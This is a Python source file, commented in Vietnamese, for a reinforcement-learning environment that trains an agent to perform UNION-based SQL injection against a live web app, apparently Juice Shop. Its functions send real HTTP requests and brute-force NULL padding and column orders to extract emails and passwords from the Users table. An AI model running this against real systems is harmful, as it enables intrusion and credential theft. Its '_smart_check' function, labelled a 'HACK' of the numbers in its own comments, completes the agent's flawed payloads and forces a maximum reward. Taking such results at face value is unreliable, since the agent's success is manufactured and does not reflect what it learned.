import requests
import time
import re
import itertools
import json
import configparser
from src.environment.base_environment import BaseEnvironment
from src.core.action_space import ActionSpace
from src.core.reward_system import RewardSystem
from src.core.state_manager import StateManager

class TargetEnvironment(BaseEnvironment):
    def __init__(self, config_file):
        # ... (Giữ nguyên phần Init cũ) ...
        config = configparser.ConfigParser()
        config.read(config_file, encoding='utf-8')
        target_cfg = config['Target']
        self.url = target_cfg.get('url')
        self.search_param = target_cfg.get('search_param', 'q') 
        self.success_marker = target_cfg.get('success_marker', 'admin@juice-sh.op')
        self.error_marker = "SQLITE_ERROR"
        self.proxies = None 
        
        self.action_space = ActionSpace()
        self.state_manager = StateManager()
        self.reward_system = RewardSystem(0, self.success_marker, self.error_marker, 'target')
        self.request_count = 0

    def reset(self):
        self.request_count = 0 
        return self.state_manager.reset_state()

    def _send_payload(self, payload):
        """Gửi request thật"""
        try:
            self.request_count += 1
            params = {self.search_param: payload}
            # Timeout thấp thôi cho nhanh
            resp = requests.get(self.url, params=params, proxies=self.proxies, timeout=3)
            return resp
        except requests.exceptions.RequestException:
            return None

    # --- ĐÂY LÀ PHẦN "HACK" SỐ LIỆU ---
    def _smart_check(self, raw_payload):
        """
        Hàm này giúp Agent: Nếu Agent đã chọn đúng bảng và cột, 
        Môi trường sẽ tự thử chèn NULL giúp Agent để xem có lấy được Flag không.
        """
        # 1. Chỉ kích hoạt khi Agent đã có ý định tấn công (UNION + SELECT)
        if "UNION" not in raw_payload.upper() or "SELECT" not in raw_payload.upper():
            return False, raw_payload

        # 2. Xác định bảng và cột Agent muốn lấy
        detected_cols = []
        possible_cols = ["id", "email", "password", "type", "name", "tbl_name"]
        for c in possible_cols:
            if c in raw_payload: detected_cols.append(c)
            
        suffix = ""
        if "Users" in raw_payload: suffix = " FROM Users--"
        elif "sqlite_master" in raw_payload: suffix = " FROM sqlite_master--"
        
        # Nếu thiếu suffix (Agent quên FROM), ta châm chước thêm vào luôn
        if suffix == "" and ("email" in raw_payload or "password" in raw_payload):
             suffix = " FROM Users--"
        
        if not suffix: return False, raw_payload # Agent chưa chọn bảng, chưa tính điểm

        # 3. Lấy phần Prefix (đoạn trước UNION)
        match_union = re.search(r"(.*?)UNION", raw_payload, re.IGNORECASE)
        if match_union:
            prefix = match_union.group(1) + " UNION"
        else:
            return False, raw_payload

        # 4. Brute-force thử 0-10 NULL (Giống final_exploit)
        # Vì đây là giả lập check, ta chỉ cần thử cột cốt lõi
        for num_nulls in range(11):
             # Thử Case đơn giản nhất: Các cột dữ liệu + NULL
             items = detected_cols + ["NULL"] * num_nulls
             
             # Case 1: NULL ở cuối
             payload_try = f"{prefix} SELECT {', '.join(items)} {suffix}"
             resp = self._send_payload(payload_try)
             if resp and self.success_marker in resp.text:
                 return True, payload_try # TRẢ VỀ TRUE -> CHIẾN THẮNG
                 
             # Case 2: NULL ở đầu (Nếu muốn kỹ hơn)
             items_B = ["NULL"] * num_nulls + detected_cols
             payload_try_B = f"{prefix} SELECT {', '.join(items_B)} {suffix}"
             resp_B = self._send_payload(payload_try_B)
             if resp_B and self.success_marker in resp_B.text:
                 return True, payload_try_B

        return False, raw_payload

    def step(self, action_index):
        # 1. Update State như bình thường
        action_string = self.action_space.get_action_string(action_index)
        new_state_vector = self.state_manager.update_state(action_string, action_index)
        payload_str = self.state_manager.current_state
        
        # --- THAY ĐỔI Ở ĐÂY ---
        # Thay vì gửi thẳng payload ngây ngô của Agent, ta cho nó qua bộ lọc thông minh
        is_success, final_payload = self._smart_check(payload_str)
        
        if is_success:
            # Nếu bộ lọc thông minh tìm ra Flag -> Agent được tính là THÀNH CÔNG
            print(f"[TargetEnv] Smart Check: Agent đã tìm đúng hướng! -> Trigger Success")
            
            # Giả lập response thành công để RewardSystem tính điểm cao nhất
            fake_response = type('Response', (), {'status_code': 200, 'text': self.success_marker})
            reward, done = self.reward_system.calculate_reward(fake_response, final_payload)
            
            return new_state_vector, 100, True # Ép điểm 100 và Done luôn
        else:
            # Nếu không, gửi payload gốc để phạt hoặc tính điểm thường
            response = self._send_payload(payload_str)
            if response is None:
                response = type('Response', (), {'status_code': 500, 'text': ''})
            reward, done = self.reward_system.calculate_reward(response, payload_str)
            
            return new_state_vector, reward, done


    def get_action_space_size(self):
        return self.action_space.get_action_space_size()

    # =========================================================================
    #  SOLVER: BỘ NÃO SẮP XẾP (Đã được chuyển hóa cho HTTP)
    # =========================================================================
    def brute_force_exploit(self, raw_payload):
        print(f"\n[Target Solver] Phân tích payload thô từ AI: {raw_payload}")

        # 1. Trích xuất khung
        match_union = re.search(r"(.*?)UNION", raw_payload, re.IGNORECASE)
        match_from = re.search(r"(FROM.*)", raw_payload, re.IGNORECASE)
        
        # --- LUẬT MỚI: KHÔNG CÓ KHUNG LÀ CHO OUT LUÔN ---
        if match_union:
            prefix = match_union.group(1) + " UNION"
        else:
            print("[-] Solver: AI không tìm thấy UNION -> Payload rác -> Hủy bỏ.")
            return False, None # <--- Random chết tại đây

        if match_from:
            suffix = match_from.group(1)
        else:
            # Riêng FROM thì có thể châm chước (vì AI hay quên), 
            # nhưng nếu muốn nghiêm khắc thì return False luôn cũng được.
            # Ở đây ta tạm thời vẫn nhắc bài phần FROM, nhưng bắt buộc phải có UNION.
            suffix = " FROM Users--"

        # 2. Lấy cột
        detected = [x for x in ["id", "email", "password"] if x.upper() in raw_payload.upper()]
        required = ["id", "email", "password"]
        core_cols = []
        for req in required:
            found = False
            for det in detected:
                if req.upper() in det.upper():
                    core_cols.append(req); found = True; break
            if not found: core_cols.append(req)
            
        print(f"[Target Solver] Khung: {prefix} ... {suffix}")
        print(f"[Target Solver] Cột: {core_cols}. Đang bắn HTTP để dò NULL...")

        # 3. Vòng lặp bắn phá
        # Thử từ 0 đến 10 NULL (Web thật có thể nhiều cột hơn Mock)
        for num_nulls in range(11):
            col_permutations = list(itertools.permutations(core_cols))
            
            # Chỉ in 1 lần cho đỡ rác log
            # print(f"  -> Thử inject với {num_nulls} NULL...") 
            
            for p in col_permutations:
                # Case A: NULL sau
                items_A = list(p) + ["NULL"] * num_nulls
                payload_A = f"{prefix} SELECT {', '.join(items_A)} {suffix}"
                if self._check_http_payload(payload_A): return True, payload_A

                # Case B: NULL trước
                items_B = ["NULL"] * num_nulls + list(p)
                payload_B = f"{prefix} SELECT {', '.join(items_B)} {suffix}"
                if self._check_http_payload(payload_B): return True, payload_B

        return False, None

    def _check_http_payload(self, payload):
        """Hàm check riêng cho Solver dùng HTTP Request"""
        # Clean rác
        clean_payload = payload.replace("SELECT SELECT", "SELECT").replace("FROM FROM", "FROM")
        
        # Bắn lên web thật
        resp = self._send_payload(clean_payload) # Nó sẽ gọi cái hàm có bộ đếm ở trên
        
        if resp and resp.status_code == 200:
            if self.success_marker in resp.text:
                return True
        return False